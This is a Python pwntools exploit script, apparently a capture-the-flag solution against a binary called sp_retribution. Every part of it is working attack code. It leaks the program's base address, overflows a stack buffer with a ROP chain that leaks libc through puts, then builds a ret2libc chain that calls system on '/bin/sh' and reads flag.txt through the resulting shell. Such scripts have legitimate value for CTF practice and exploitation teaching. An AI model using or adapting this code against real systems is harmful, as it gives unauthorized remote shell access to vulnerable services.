#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf, libc):
    # leak elf base address 
    io.sendlineafter(b">> ", b"2")
    payload = b"A"*16
    io.sendafter(b"y = ", payload)
    io.recvuntil(b"y = " + payload)
    leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    elf.address = leak - 319 - elf.symbols["main"]
    print("main: ", hex(elf.symbols["main"]))
    
    # leak libc
    puts = elf.symbols["puts"]
    puts_got = elf.got["puts"]
    main = elf.symbols["main"]
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    
    rop_chain = flat(pop_rdi, puts_got, puts, main)
    payload = b"A"*88 + rop_chain
    io.sendlineafter(b"(y/n): ", payload)
    io.recvline()
    io.recvline()
    leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc.address = leak - libc.symbols["puts"]
    print("libc: ", hex(libc.address)) 
    
    # ret2libc
    io.sendlineafter(b">> ", b"2")
    io.sendafter(b"y = ", b"A")

    binsh = next(libc.search(b"/bin/sh"))
    rop_chain = flat(pop_rdi, binsh, libc.symbols["system"])
    payload = b"A"*88 + rop_chain
        
    io.sendafter(b"(y/n): ", payload) 
    io.recv() 
    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)


def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./sp_retribution")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    elf = ELF("./sp_retribution")
    libc = ELF("./glibc/libc.so.6")
    exploit(io, elf, libc)



if __name__ == "__main__":
    main()
